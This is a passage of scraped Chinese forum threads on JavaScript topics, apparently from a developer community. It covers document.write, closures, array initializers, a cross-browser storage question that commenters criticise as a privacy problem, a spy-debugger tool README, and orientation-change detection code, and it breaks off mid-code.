href=\"http://www.gopherjs.org/blog/2016/08/21/gopherjs-1.7-1-release\" rel=\"nofollow\">http://www.gopherjs.org/blog/2016/08/21/gopherjs-1.7-1-release</a></p>\n<h2>Fable</h2>\n<p>一个 F#转 JavaScript 的编译器。</p>\n<p>项目地址：<a href=\"https://fable-compiler.github.io/\" rel=\"nofollow\">https://fable-compiler.github.io/</a></p>\n<p><strong>然而，为什么不直接写 JavaScript 呢？</strong></p>\n<p>原文链接： <a href=\"http://t.cn/Rc2oF2j\" rel=\"nofollow\">http://t.cn/Rc2oF2j</a></p>\n<p>微信号：程序员晋级之路『 code-learning 』</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVAqVW\"></p>\n</div></div>"], "reply": "4", "tittle": "JavaScript 新鲜事·第 6 期", "comment": ["赞", "赞", "不错哦。", "我想知道的是如何才能拥有楼主这样庞大有效的信息源， 求指导一波～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 console 输入 document.write()会清空原来的内容，但再次执行的时候会在原来的基础上追加。</p>\n<p>这是为什么啊？</p>\n</div></div>"], "reply": "10", "tittle": "js 中 document.write()会不会清空原来文档内容？", "comment": ["document.write()只有在 javascript 首次加载运行的时候执行，如果页面已经加载完毕，执行这个的效果是抹掉整个页面换成 write 的字符串。毕竟你都不知道 write 到什么位置去。\r", "另外带 async 属性的 script 也不能用，用了没有效果。", " 按照 MDN 的说话， write 方法必须在一个 open 过的文档里执行，如果没有 open 过，就会帮你 open 。 open 会把当前文档清空。\r", "document.open()\r", "document.write(1)\r", "document.write(2)\r", "document.close()\r", "document.write(3)\r", "在控制台试试。\r", "\r", "不要看 W3Schools 了。", "不看 MDN ，谁能猜到有 close 一说。", "好吧  W3Schools 也介绍 close 了，不错哦。", " 这个我也试过，就是不理解为什么会这样。 MDN 也只是说没有 document.open 就会自动调用。\r", "\r", "还有个疑问，页面加载的过程中是不是相当于执行了 document.open()和 document.close()?然后在页面内嵌 document.write()就不会清空内容，后期页面加载后调用就会？", "\r", "当你打开一个页面，浏览器会\r", "\r", "1. （前面做了很多事情，与本文无关，省略）\r", "\r", "2. 调用 document.open() 打开文档\r", "\r", "3. document.write(...) 将下载到的网页内容写入文档\r", "\r", "4. 所有内容写完了，就调用 document.close()\r", "\r", "5. 触发 dom ready 事件（ DOMContentReady)\r", "\r", "\r", "\r", "所以你如果在第 4 步之前 document.write(1) 那么你就直接追加内容到当前位置，\r", "\r", "如果你在第 4 步之后 document.write()，那么由于 document 已经 close 了，所以必须重新 document.open() 来打开文档，这一打开，内容就被清空了。 \r", "\r", "\r", "\r", "不信你可以这样验证一下：\r", "\r", "1. 打开 ", " 等页面加载完\r", "\r", "2. 在控制台运行 document.write(1)，会看到页面清空，只有一个 1\r", "\r", "3. 再次运行 document.write(1)，会发现页面没有清空， 1 变成了 11 ，因为追加了一个 1\r", "\r", "4. 运行 document.close()，这时文档就关闭了。\r", "\r", "5. 再次运行 document.write(1)，你会发现文档又清空了，变成了 1 。\r", "\r", "\r", "\r", "完", "楼上牛逼，完了。", " 涨见识了 2333", " 介绍的很清楚！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://log.zvz.im/2016/09/03/understand-js-closure/\" rel=\"nofollow\">去我的博客读一读</a></p>\n<p>在 Javascript 语言中，闭包就是一个函数，只是它上下文中的变量以引用的形式与其绑定在了一起。</p>\n<pre><code>function getMeAClosure() {\n  var canYouSeeMe = \"here I am\";\n  return (function theClosure() {\n    return {canYouSeeIt: canYouSeeMe ? \"yes\" : \"no\"};\n  });\n}\n\nvar closure = getMeAClosure();\nclosure().canYouSeeIt; //\"yes\"\n</code></pre>\n<p>实际上每个 Javascript 函数在生成的时候都形成了闭包。稍后我会给大家解释闭包的产生原因和过程，然后纠正一些关于闭包的错误概念，最后再给出一些闭包的实际用例。不过首先简单介绍一下闭包相关的基础概念： Javascript 的闭包是通过 <code>词法域 (lexical scope)</code> 和 <code>变量环境 (VariableEnvironment)</code> 实现的。</p>\n\n<h2>词法域（ Lexical Scope ）</h2>\n<p>“词法”这个词一般都是语言相关。所以函数的词法域是静态的，是由函数代码在源代码中的位置决定的。</p>\n<p>参考以下代码：</p>\n<pre><code>var x = \"global\";\nfunction outer() {\n  var y = \"outer\";\n  function inner() {\n    var x = \"inner\";\n  }\n}\n</code></pre>\n<p>函数 <code>inner</code> 在代码中被函数 <code>outer</code> 包裹着，而 <code>outer</code> 又被全局上下文包含在内。这样就形成了一个词法继承关系：</p>\n<p>global</p>\n<p>— outer</p>\n<p>—— inner</p>\n<p>每个函数的外部词法域都是由词法继承关系中它的祖先决定的。因此，<code>inner</code> 函数的外部词法域就是由全局对象和函数 <code>outer</code> 组成的。</p>\n<h2>变量环境（ VariableEnvironment ）</h2>\n<p>全局对象有一个相关的执行上下文。而且每一次函数调用也会建立并进入一个新的执行上下文。这个执行上下文相对于静态的词法域是动态生成的。每一个执行上下文都确定了一个变量环境，它是在该上下文中所声明变量的容器。（<a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-262.pdf\" rel=\"nofollow\">ES 5</a> 10.4 ， 10.5 ）</p>\n<blockquote>\n<p>注意，在 EcmaScript 3 中，函数的变量环境（ VariableEnvironment ）被称为活动对象（ ActivationObject ）</p>\n</blockquote>\n<p>以下伪代码可以用来描述变量环境</p>\n<pre><code>//variableEnvironment: {x: undefined, etc.};\nvar x = \"global\"\n//variableEnvironment: {x: \"global\", etc.};\n\nfunction outer() {\n  //variableEnvironment: {y: undefined};\n  var y = \"outer\";\n  //variableEnvironment: {y: \"outer\"};\n  \n  function inner() {\n    //variableEnviroment: {x: undefined};\n    var x = \"inner\";\n    //variableEnvironment: {x: \"inner\"};\n  }\n}\n</code></pre>\n<p>不过，这只描述了整个图景中的一部分。每个变量环境都会继承它所属词法域的变量环境。</p>\n<h2>[[scope]]属性</h2>\n<p>当一个函数定义过程发生在某个执行上下文环境中时，会生成一个新的函数对象，此函数对象会包含一个名为 [[scope]] 的内部属性引用当前的变量环境。（<a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-262.pdf\" rel=\"nofollow\">ES 5</a> 13.0-2 ）</p>\n<p>每个函数都有这样一个 [[scope]] 属性，而且当函数被调用时，这个 [[scope]] 属性会被赋值给变量环境的 <em>outerLex</em> 属性，该属性是对外层词法环境的引用（ outer lexical environment reference 简写为 outerLex ）。这样一来，每个变量环境都继承了它父级的变量环境。这个 [[scope]] 链会一直延伸至全局对象，与词法继承的长度一样。</p>\n<p>现在让我们再来看一下伪代码：</p>\n<p><a href=\"https://log.zvz.im/2016/09/03/understand-js-closure/\" rel=\"nofollow\">继续阅读</a></p>\n</div></div>"], "reply": "7", "tittle": "搞不明白的 javascript 闭包", "comment": ["不是有 let 吗", " 文章比较老了，我这是翻译过来的", "这个写的太复杂，不通俗易懂，举得列子也不好。\r", "\r", "阮一峰写的挺好   ", "\r", "\r", "还有这个教程里面的  ", "mark 一下", "博客蛮好看的 是什么程序？", "看样子像 Hexo 。", " \r", " \r", "就是 hexo ，主题是 [jane]( ", ")"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>function add(x, y) {\n  return x + y;\n}\n\n// 将函数赋值给一个变量\nvar operator = add;\n\n// 将函数作为参数和返回值\nfunction a(op){\n  return op;\n}\na(add)(1, 1)\n</code></pre>\n<p>最后调用时，按正常写法不是应该这样写吗： a(add(1, 1))？\n为什么写成 a(add)(1, 1)也是可以得，这种写法怎么理解？</p>\n</div></div>"], "reply": "2", "tittle": "JS function 作为参数，写法的疑惑", "comment": ["一般我调用函数都是 a(arg) ;  add 函数由函数 a 返回，那 a(add) 不省略的就是 var fun = a(add) ; 然后 fun(1,1) 所以  才是 a(add)(1,1)  ;   a(add(1,1)) 这里传递给函数 a 函数就不是函数 add 了 而是 add 操作后的结果值 ，显然不是一个函数类型参数", "  豁然开朗 谢谢"]},
{"content": ["<div class=\"topic_content\">有点难\r<br>地址在这里 <a target=\"_blank\" href=\"http://perfectionkills.com/javascript-quiz-es6\" rel=\"nofollow\">http://perfectionkills.com/javascript-quiz-es6</a></div>"], "reply": "5", "tittle": "今天看到的一个关于 ES6 的一些测验题，分享给大家", "comment": ["就对了 4 个~~好多坑", "错了 4 个", " 也不算坑吧，就是有些太刁钻了", "You've got 9 answers wrong (#1, #2, #3, #4, #8, #9, #10, #11, #12).\r", "That's more than a half :(", "同就 4 个，简直了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>4.2  Object and Array Initializers\nObject and array initializers are expressions whose value is a newly created object or\narray. These initializer expressions are sometimes called “ object literals ” and “ array\nliterals.” Unlike true literals, however, they are not primary expressions, because they\ninclude a number of subexpressions that specify property and element values. Array\ninitializers have a slightly simpler syntax, and we ’ ll begin with those.\nAn array initializer is a comma-separated list of expressions contained within square\nbrackets. The value of an array initializer is a newly created array. The elements of this\nnew array are initialized to the values of the comma-separated expressions:\n[]         // An empty array: no expressions inside brackets means no elements\n[1+2,3+4]  // A 2-element array.  First element is 3, second is 7\nThe element expressions in an array initializer can themselves be array initializers,\nwhich means that these expressions can create nested arrays:\nvar matrix = [[1,2,3], [4,5,6], [7,8,9]];</p>\n<p><em>The element expressions in an array initializer are evaluated each time the array ini-\ntializer is evaluated. This means that the value of an array initializer expression may be\ndifferent each time it is evaluated.</em></p>\n<p>淘宝翻译版： JavaScript 对数组初始化表达式进行求值得时候，数组初始化表达式中的元素表达式也都会各自计算一次。也就是说，数组初始化表达式每次计算的值都有可能是不同的.</p>\n<p>问题：\n1 ，为什么不同？\n2 ，意味着什么？怎么样表现？有什么坑能举个栗子么?</p>\n<p>Undefined elements can be included in an array literal by simply omitting a value be-\ntween commas. For example, the following array contains five elements, including three\nundefined elements:\nvar sparseArray = [1,,,,5];</p>\n</div></div>"], "reply": "5", "tittle": "Javascript 权威指南中的 Array Initializer 的问题求教", "comment": ["自我理解尝试，求大神确认下， Chrome 调试：\r", "\r", "var x =1 声明\r", "1 打印\r", "\r", "var b = [[1+x],[2+x],[3+x]];  声明\r", "b[0] 打印\r", "[2]\r", "\r", "x =2 声明\r", "2 打印\r", "\r", "b[0] 声明\r", "[2] 打印\r", "\r", "b 尝试调用一下\r", "b[0]\r", "[2]  没解析\r", "\r", "var b = [[1+x],[2+x],[3+x]]; //重新声明下\r", "b[0]\r", "[3] 重新解析元素表达式了\r", "\r", "\r", "\r", "求问书上的那句话是想表达这个点么？", "var obj = {\r", "    _foo: 0,\r", "    get foo() {\r", "        return this._foo++;\r", "    },\r", "};\r", "var ary = [obj.foo, obj.foo, obj.foo];\r", "console.log(ary);", " 是的就是你 demo 的意思， array 每次运行到的时候才会求值然后构造 array ，所以运行时的结果不同同样的 array 表达式的值也不同。就是说这个意思。", "呃，这个不是很常见的情况吗，数组的初始化值是动态的，所以每次初始化的结果不一定相等", "谢谢各位，本来不理解的是如果只是 var x =[1,2,3] 那再次重复声明下 var x= [1,2,3,4]当然不一样是句废话。 那再次声明 var x=[1,2,3]的话那是全等的啊怎么会可能不一样。所以其实是这句话可能缺少了“在数组内部嵌套的元素数组中，有对象类型的量”这个条件来使之可能被动态修改。所以本菜踩坑少就纠结了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>意思就是说，我在 IE 上存储的的值可以在 chrome 等其他浏览器读取的，各个浏览器之间可以共享存储，\n之前试过一种方式是 Flash 的 SharedObject,但是 chrome 对 Flash 插件的机制不一样，所有 chrome 不能和其他浏览器共享存储， 你们有其他什么解决方案吗？</p>\n</div></div>"], "reply": "31", "tittle": "跨浏览器存储，你们有什么好的方案？", "comment": ["给客户机安装一个插件，让所有浏览器都加载，然后就好了。。。。。现在浏览器都是沙箱模式，也就插件可以绕过沙箱访问数据了", "0day", "存到数据库。。", "个人觉得工程量比较小的方法有两种：\r", "1. 写个后端，然后用 ajax 来调数据出来。\r", "2. 如果客户机有网络，就用 firebase 。", "广告联盟都还没使用的技术……", "applet", " @", "  不存服务端，需要存在浏览器端，因为需要解决的问题就是像 @", " 说的一样，广告联盟还没使用的技术，需要存储浏览器用户访问者的唯一 ID ，当然 applet 和 浏览器器插件更改不可能，存在兼容性问题。 我也觉得暂时没有什么技术可以解决这个问题。", "window.localStorage", "如果是一个开放圈子，现有浏览器技术，是没有办法实现跨浏览器获取 设备唯一识别 （我这里称为 DeviceID ）。\r", "如果是一个封闭的圈子，用 UserID 比 DeviceID 更有效。\r", "\r", "有人提到插件和客户端等方式 ，如果你的追踪对象允许安装这些客户端，我相信登录操作的成本比安装客户端更底。", "真会异想天开\r", "你连存服务器都无可能，还想存客户端\r", "\r", "最理想解决方案，开发一个操作系统，把 Microsoft Windows 干下去", " 不是异想天开，我现在在 IE 存储一个值，你可以认为这个值为一个 cookie ，我可以在 firefox 上取到这个值。", " 这不是异想天开，但是就是搞笑的需求\r", "你在 IE 存一个值和在 chrome 在 QQ 在 UC 在 FF 等的情况都不一样，浏览器要是能给你跨平台读取数据那就是漏洞了\r", "做这种东西就应该做一个 PC 客户端", "  你做一个 PC 客户端也只能解决一个用了你 PC 的用户的问题，互联网上这么多的用户各个终端不一样，各个浏览器不一样，各种兼容不兼容，考虑的情况非常很多。  这也不是一个搞笑的需求，这个是业务场景就确实存在的需求，而且在广告与网站监测等领域也确实在生产环境中实践过，只是现在还存在兼容和效率问题，不是非要让你通过浏览器这个途径出发去解决这个问题。", "可以让浏览器开发一个功能，存在一个任何用户都可以读的一个公共地方，你自己把需要的数据放里面，对了，为了安全性，你用自己的 key 或者算法加密后储存，读取时解密。。。。。。\r", "其他自己想吧", " 这不是搞笑的需求什么是搞笑的需求？\r", "\r", "在这个大家越来越重视隐私，浏览器厂商越来越多地用 DNT ， Sandbox 等政策 /技术限制网站 /插件获取个人信息的时代，还要逆潮流而行研究如何记录 /传输个人信息，这还不搞笑吗？\r", "\r", "我话放这了，即使你能找到什么漏洞，不出一年，最新的浏览器肯定统统不能用。", "  存储信息就代表不重视隐私了？   从 cookie 到 Web Storage , IndexDB  以及 WebSql ，浏览器一直都在满足各种存储，提升开发体验，你觉得这样有问题？", " 那是在保护个人信息不泄露的前提下做的存储方案，不管是 webStorage 还是 indexDB （ webSQL 都废弃了提这个干吗），最重要的特性都是不能在外域获取信息，避免其他网站存储的信息被泄露和盗用，你这倒好，不要说跨域了，都跨浏览器了，你觉得这样没问题？\r", "\r", "如果没问题，你觉得为什么这种各大广告厂商、黑客、政府监听部门都喜闻乐见的功能为什么还没烂大街呢？", "这个只能写端了吧, 不走后端, 纯浏览器是没可能的...上面已经说了..", "对此，我想到了 QQ ，点击客户端上的链接，无论打开什么浏览器都能获得相应的信息。\r", "当然，如果说你没权限要求用户装客户端和登陆，我只能往不好的方向揣测这么干的意图。", "开发一个类似 QQ 的客户端，装在客户机上", " 说得对了，这真是个搞笑的需求，浏览器就是个沙盒，对 Flash 知名插件也是会有沙盒。除了写个桌面应用级的插件来实现，别无他法。", "其实我第一个回复就是想说这个需求不现实。。。 Flash 共享数据就是个漏洞。。。早该补上了。。。\r", "\r", "我们设想一种情况（ X 域是攻击者， Y 域是被攻击者）， A 浏览器有安全问题，导致域名 X 可以跨域访问 Y 的内容， B 浏览器没有这个问题，那么当用户使用 B 浏览器的时候，留下了关键数据 a ，然后再使用 A 浏览器访问 X 域，然后 X 域通过跨域漏洞伪装为 Y 域，可以读取到关键数据 a 。。。。\r", "\r", "这就是强行扩大攻击面的做法。。。有道德的浏览器厂商都不会提供类似的接口，能用的一定是（浏览器自身或者第三方的）漏洞。。。\r", "\r", "Flash 有的那个方法，实际就是个漏洞，所以 Chrome 各种限制 Flash ，最新版是默认不加载 Flash 插件的（这就是为啥我上 B 站视频都白屏的原因。。。）。\r", "\r", "Flash 被批漏洞多不是没有道理的", "也可以操作剪切板跨一些浏览器存值", "不建议这么搞。即使现在能走通，很有可能过一阵子就不能用了。这是给自己找麻烦。", "这种要实现大一统的，要么远程传输数据，要么每个都开发插件，没其他办法.", "朋友你真的懂浏览器吗？你这个思路就是奔着 0day 去的，还谈个什么", "我想问，有没有什么技术，能让我操作别人的硬盘，逃", "你怎么保证不同用户使用同一台电脑是使用其本人的账户……", "SharedObject  我已经用了好几年了， 嘿嘿", "你自己也知道 SharedObject 在 Chrome 里不能用（因为在沙盒里）。\r", "\r", "再过两个版本 Chrome 里 Flash 就是缺省关闭的了； Firefox 早就缺省不安装 Flash 了。\r", "\r", "难道你还看不出趋势还想问怎么挖洞？嘿嘿"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目地址在 github 上： <a href=\"https://github.com/wuchangming/spy-debugger\" rel=\"nofollow\">https://github.com/wuchangming/spy-debugger</a></p>\n<p><a href=\"https://github.com/wuchangming/spy-debugger/stargazers\" rel=\"nofollow\"><img alt=\"GitHub stars\" src=\"https://img.shields.io/github/stars/wuchangming/spy-debugger.svg\"></a>     <a href=\"https://github.com/wuchangming/spy-debugger/network\" rel=\"nofollow\"><img alt=\"GitHub forks\" src=\"https://img.shields.io/github/forks/wuchangming/spy-debugger.svg\"></a></p>\n<h1>关于 spy-debugger</h1>\n<p>一站式页面调试、抓包工具。远程调试任何手机浏览器页面，任何手机移动端 webview （如：微信， HybirdApp 等），支持： HTTP/HTTPS</p>\n<h2>Demo</h2>\n<h4>调试界面</h4>\n<p><img alt=\"demo.png\" src=\"//dn-cnode.qbox.me/FqLrTApKhUlbYJT02dWEdDjvmSYC\"></p>\n<h4>抓包界面</h4>\n<p><img alt=\"AnyProxy.jpg\" src=\"//dn-cnode.qbox.me/FlI9WS_VvTgu0tdUXHeHoKvPyak-\"></p>\n<h2>特性</h2>\n<p>1 、页面调试＋抓包<br>\n2 、<a href=\"#%E4%B8%89%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B\" rel=\"nofollow\">操作简单</a><br>\n3 、<strong>支持 HTTPS</strong>。<br>\n4 、<code>spy-debugger</code>内部集成了<a href=\"http://people.apache.org/%7Epmuellr/weinre/docs/latest/\" rel=\"nofollow\"><code>weinre</code></a>、<a href=\"https://github.com/wuchangming/node-mitmproxy\" rel=\"nofollow\"><code>node-mitmproxy</code></a>、<a href=\"https://github.com/alibaba/anyproxy\" rel=\"nofollow\"><code>AnyProxy</code></a>。<br>\n5 、自动忽略原生 App 发起的 https 请求，只拦截 webview 发起的 https 请求。对使用了 SSL pinning 技术的原生 App 不造成任何影响。<br>\n6 、可以配合其它代理工具一起使用(默认使用 AnyProxy) [(设置外部代理)](#设置外部代理默认使用 anyproxy)</p>\n<h2>安装</h2>\n<p>Windows 下</p>\n<pre><code>npm install spy-debugger -g\n</code></pre>\n<p>Mac 下</p>\n<pre><code>sudo npm install spy-debugger -g\n</code></pre>\n<h2>三分钟上手</h2>\n<p>第一步：手机和 PC 保持在同一网络下（比如同时连到一个 Wi-Fi 下）</p>\n<p>第二步：命令行输入<code>spy-debugger</code>，按命令行提示用浏览器打开相应地址。</p>\n<p>第三步：设置手机的 HTTP 代理，代理 IP 地址设置为 PC 的 IP 地址，端口为<code>spy-debugger</code>的启动端口(默认端口： 9888)。</p>\n<p>第四步：安装证书。<strong>注：手机必须先设置完代理后再通过(非微信)手机浏览器访问<code><a href=\"http://spydebugger.com/cert\" rel=\"nofollow\">http://spydebugger.com/cert</a></code>安装证书</strong>（手机首次调试需要安装证书，已安装了证书的手机无需重复安装)。</p>\n<p>第五步：用手机浏览器访问你要调试的页面即可。</p>\n<h2>自定义选项</h2>\n<h4>端口</h4>\n<p>(默认端口： 9888)</p>\n<pre><code>spy-debugger -p 8888\n</code></pre>\n<h4>设置外部代理（默认使用 AnyProxy ）</h4>\n<pre><code>spy-debugger -e http://127.0.0.1:8888\n</code></pre>\n<p>spy-debugger 内置 AnyProxy 提供抓包功能，但是也可通过设置外部代理和其它抓包代理工具一起使用，如： Charles 、 Fiddler 。</p>\n<h4>是否让 weinre 监控 iframe 加载的页面</h4>\n<p>(默认： false)</p>\n<pre><code>spy-debugger -i true\n</code></pre>\n<h4>是否只拦截浏览器发起的 https 请求</h4>\n<p>(默认： true)</p>\n<pre><code>spy-debugger -b false\n</code></pre>\n<p>有些浏览器发出的 connect 请求没有正确的携带 userAgent ，这个判断有时候会出错，如<strong>UC 浏览器</strong>。这个时候需要设置为 false 。大多数情况建议启用默认配置： true ，由于目前大量 App 应用自身（非 WebView ）发出的请求会使用到 SSL pinning 技术，自定义的证书将不能通过 app 的证书校验。</p>\n<h4>是否允许 HTTP 缓存</h4>\n<p>(默认： false)</p>\n<pre><code>spy-debugger -c true\n</code></pre>\n<h2>更多</h2>\n<p><code>spy-debugger</code>原理是集成了<code>weinre</code>，简化了<code>weinre</code>需要给每个调试的页面添加 js 代码。<code>spy-debugger</code>原理是拦截所有 html 页面请求注入<code>weinre</code>所需要的 js 代码。让页面调试更加方便。</p>\n</div></div>"], "reply": "30", "tittle": "分享：真机页面调试＋抓包，调试微信生产环境 HTTPS 页面工具集成。(weinre + AnyProxy)", "comment": ["不仅限于微信，所有手机端的页面都支持", "👍", " Thanks", "赞！", " ， Thanks 。\r", "使用中有遇到什么问题可以和我反馈。尽量做到更好\r", "好，之前我用 Charles + Proxifier 调试，现在可以扔了！", "  : )", "看上去挺不错的！先试用看看效果~", " 欢迎试用   : )", "长时间使用， AnyProxy 可能导致 crash ，不知道 AnyProxy 什么时候能更新一版本", "有 fiddler 好用吗", "mark", " ,看场景，如果你要调试页面。或者看 js 的 log 。 fiddler 就没办法了", " ，但 spy-debugger 也可以结合 fiddler 一起用。\r", "\r", " anyproxy\r", "\r", "启动方式：\r", "spy-debugger -e ", " 端口]", "这个可以有，非常不错的我工具", "  : )", "   现在用的这个，微信官方出的，感觉还行", " ，嗯，这个不支持 HTTPS", " 而且没有找到开源代码。。本来想改它的。", "太棒了", "mark", "真棒！！！", "回复只为点赞！", "  ,哈哈，谢谢！", " 最新的版本支持使用 chrome inspector 远程调试 可以支持 https 的", "weinre 比较弱..我建议还是用 xposed 给所有的 webview 都开启 remote debug 然后用 chrome 的 remote inspector 调试", " ，嗯， inspector 是安卓调试里最方便实用的。你这方法我有空研究下。不过对我这种安卓小白来说，难度有点大。", "厉害了", "简直就是解决手机调试的一枚银弹！\r", "以前都要看平台的，这一个方法解决了所有平台调试问题，还解决了 https 不能调试的问题。", " 谢谢支持。使用过程中有问题，欢迎提 issue ，我会尽力去完善该项目。"]},
{"content": ["<div class=\"topic_content\">chrome 插件弹出来那个页面用的， CSS 实在不会，样式丑的一比… 用 bootstrap 感觉也不咋好看</div>"], "reply": "4", "tittle": "有没有什么适合 chrome 插件的前端框架？", "comment": ["你想要哪种风格……\r", "metro 还是 ios 6 还是 ios 7 那种……", "请叫扩展 需求太不明确", " 都行啊  不太丑 容易布局就行，是不是可以用那些移动端的框架？", "基于 bootstrap 衍生出来了很多，直接 Google 就好了……"]},
{"content": ["<div class=\"topic_content\">效果已经实现，看起来还好，公司没个大神，我一做 Android 问我前端的问题</div>"], "reply": "8", "tittle": "公司国庆要做一个活动，砸金蛋时金花四溅的效果怎么用 js 实现，哪位大神有做过", "comment": ["可以用个 gif 图。", "能用 gif 。。干嘛用代码呢= =！", "为啥要 JS 直接 GIF boom ！", "看到这种活动我都是默默按下 F12\r", "\r", "记得上次锤子砸蛋活动，直接一行代码把全部蛋砸了", "去 codepen 上找找看", "参考一下这个： ", "也就是碎片爆炸效果吧。\r", "codepen 搜了下 explode 找到个这个：\r", "gif 图……如果觉得不好就把 gif 图的每一帧拿出来拼成长图……自己用 js 来移动 background-image 的位置就好了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前不久，做了一个 H5 项目，需要在横竖屏变化时，做一些处理。毫无疑问，需要使用<code>orientationchange</code>来监听横竖屏的变化。</p>\n<h3>方案一：</h3>\n<pre><code>// 监听 orientation changes\nwindow.addEventListener(\"orientationchange\", function(event) {\n\t// 根据 event.orientation|screen.orientation.angle 等于 0|180 、 90|-90 度来判断横竖屏\n}, false);\n</code></pre>\n<p>代码添加上后，就各种兼容性问题。这里兼容性问题出现在两个地方：</p>\n<ul>\n<li><code>orientationchange</code></li>\n<li><code>event.orientation|screen.orientation.angle</code></li>\n</ul>\n<h5>如下是<code>orientationchange</code>事件的兼容性：</h5>\n<p><a href=\"http://www.quirksmode.org/dom/events/orientationchange.html\" rel=\"nofollow\"><img alt=\"orientationchange.png\" src=\"http://zhansingsong.github.io/pl/demo/orientationchange.png\"></a></p>\n<h5>如下是<code>screen.orientation</code>的兼容性：</h5>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Screen/orientation\" rel=\"nofollow\"><img alt=\"screen.orientation\" src=\"http://zhansingsong.github.io/pl/demo/screen.png\"></a></p>\n<h3>方案二：</h3>\n<p>上述方案不行，只能另行他法了。 google 一下，了解到可以通过<code>resize</code>配合<code>(window.inner/outerWidth, window.inner/outerHeight)</code>来实现：</p>\n<pre><code>window.addEventListener(\"resize\", function(event) {\n    var orientation=(window.innerWidth &gt; window.innerHeight)? \"landscape\":\"portrait\";\n    if(oritentation === 'portrait'){\n    \t// do something ……\n    } else {\n    \t// do something else ……\n    }\n}, false);\n</code></pre>\n<p>这种方案基本满足大部分项目的需求，但是还是有些不足之处：</p>\n<ul>\n<li>只要 window 的 size 变化，就会不断触发触发<code>resize</code>事件。可以使用 setTimeout 来优化一下</li>\n<li>如果有多个地方需要监听横竖屏，就需要注册多个<code>window.addEventListener(\"resize\", function(event) {……})</code>。能不能通过<code>订阅与发布模式</code>来改进一下，只注册一个<code>resize</code>负责监听横竖屏变化，只要横竖发生变化就发布通知订阅的对象。其他需要监听横竖屏的地方只需订阅一下即可。</li>\n</ul>\n<p>关键代码如下：</p>\n<pre><code>    var resizeCB = function(){\n      if(win.innerWidth &gt; win.innerHeight){//初始化判断\n        meta.init = 'landscape';\n        meta.current = 'landscape';\n      } else {\n        meta.init = 'portrait';\n        meta.current = 'portrait';\n      }\n      return function(){\n        if(win.innerWidth &gt; win.innerHeight){\n          if(meta.current !== 'landscape'){\n            meta.current = 'landscape';\n            event.trigger('__orientationChange__', meta);\n          }\n        } else {\n          if(meta.current !== 'portrait'){\n            meta.current = 'portrait';\n            event.trigger('__orientationChange__', meta);\n          }\n        }\n      }\n    }();\n</code></pre>\n<p><a href=\"https://github.com/zhansingsong/orientationchange-fix/blob/master/other/pl_2.js\" rel=\"nofollow\">完整代码猛击这里</a></p>\n<h3>方案三：</h3>\n<p>不过个人觉得通过<code>window.innerWidth &gt; window.innerHeight</code>来实现的是一种伪检测，有点不可靠。 可不可以通过浏览器来实现检测？如基于 CSS3<code>@media</code>媒体查询来实现。</p>\n<p>如下<code>@media</code>兼容性：\n<a href=\"http://caniuse.com/#feat=css-mediaqueries\" rel=\"nofollow\"><img alt=\"media\" src=\"http://zhansingsong.github.io/pl/demo/media.png\"></a>\n如上上图所示，移动端浏览器都支持 CSS3 media 。</p>\n<h5>实现思路：</h5>\n<ul>\n<li>创建包含标识横竖屏状态的特定 css 样式</li>\n<li>通过 JS 向页面中注入 CSS 代码</li>\n<li>resize 回调函数中获取横竖屏的状态</li>\n</ul>\n<p>这里我选择<code>&lt;html&gt;&lt;/html&gt;</code>的节点<code>font-family</code>作为检测样式属性。理由如下：</p>\n<ul>\n<li>选择<code>&lt;html&gt;&lt;/html&gt;</code>主要为了避免 reflow 和 repaint</li>\n<li>选择<code>font-family</code>样式，主要是因为<code>font-family</code>有如下特性：</li>\n</ul>\n<blockquote>\n<ul>\n<li>优先使用排在前面的字体。</li>\n<li>如果找不到该种字体，或者该种字体不包括所要渲染的文字，则使用下一种字体。</li>\n<li>如果所列出的字体，都无法满足需要，则让操作系统自行决定使用哪种字体。</li>\n</ul>\n</blockquote>\n<p>这样我们就可以指定特定标识来标识横竖屏的状态，不过需要将指定的标识放置在其他字体的前面，这样就不会引起 hmtl 字体的变化。</p>\n<p>关键代码如下：</p>\n<pre><code>    // callback\n    var resizeCB = function() {\n        var hstyle = win.getComputedStyle(html, null),\n            ffstr = hstyle['font-family'],\n            pstr = \"portrait, \" + ffstr,\n            lstr = \"landscape, \" + ffstr,\n            // 拼接 css\n            cssstr = '@media (orientation: portrait) { .orientation{font-family:' + pstr + ';} } @media (orientation: landscape) {  .orientation{font-family:' + lstr + ';}}';\n        // 载入样式\t\t\n        loadStyleString(cssstr);\n        // 添加类\n        html.className = 'orientation' + html.className;\n        if (hstyle['font-family'] === pstr) { //初始化判断\n            meta.init = 'portrait';\n            meta.current = 'portrait';\n        } else {\n            meta.init = 'landscape';\n            meta.current = 'landscape';\n        }\n        return function() {\n            if (hstyle['font-family'] === pstr) {\n                if (meta.current !== 'portrait') {\n                    meta.current = 'portrait';\n                    event.trigger('__orientationChange__', meta);\n                }\n            } else {\n                if (meta.current !== 'landscape') {\n                    meta.current = 'landscape';\n                    event.trigger('__orientationChange__', meta);\n                }\n            }\n        }\n    }();\n</code></pre>\n<p><a href=\"https://github.com/zhansingsong/orientationchange-fix/blob/master/other/pl_3.js\" rel=\"nofollow\">完整代码猛击这里</a></p>\n<h4>测试效果</h4>\n<ul>\n<li>portrait 效果：\n<img alt=\"p\" src=\"http://zhansingsong.github.io/pl/demo/p.png\"></li>\n<li>landscape 效果：\n<img alt=\"p\" src=\"http://zhansingsong.github.io/pl/demo/l.png\"></li>\n</ul>\n<h2>方案四：</h2>\n<p>可以再改进一下，在支持<code>orientationchange</code>时，就使用原生的<code>orientationchange</code>，不支持则使用<strong>方案三</strong>。</p>\n<p>关键代码如下：</p>\n<pre><code>// 是否支持 orientationchange 事件\nvar isOrientation = ('orientation' in window &amp;&amp; 'onorientationchange' in window);\n// callback\nvar orientationCB = function(e) {\n    if (win.orientation === 180 